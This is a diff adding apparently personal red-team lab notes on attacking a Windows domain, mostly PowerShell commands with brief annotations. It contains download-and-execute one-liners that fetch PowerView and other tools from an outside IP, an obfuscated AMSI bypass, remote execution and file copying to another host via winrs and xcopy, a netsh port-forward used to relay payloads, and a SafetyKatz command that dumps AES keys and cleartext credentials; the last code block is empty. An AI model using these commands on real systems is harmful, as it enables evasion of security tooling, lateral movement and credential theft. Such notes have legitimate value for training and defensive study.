@@ -1,0 +1,38 @@
+```powershell
+iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb)
+```
+
+```powershell
+S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+```powershell
+iex(iwr 'http://172.16.100.48/PowerView.ps1' -useb)
+iex(iwr 'http://172.16.100.48/Invoke-SessionHunter.ps1' -useb)
+iwr http://172.16.100.48/Loader.exe -o C:\Users\Public\Loader.exe
+iwr http://172.16.100.48/Loader.exe -o C:\Users\Public\Loader.exe
+```
+
+You must have administrator access to list sessions - netexec equivalent
+```powershell
+Find-DomainUserLocation
+
+winrs -r:dcorp-mgmt cmd /c "set computername && set username"
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+Add port forward to machine to forwards to webserver - downloading executable is bad
+```powershell
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
+```
+
+Download from local loopback
+```powershell
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
+```
+
+Note down the `aes256_hmac` and the cleartext credentials 
+Use Rubues on attacking machine
+```powershell
+
+```
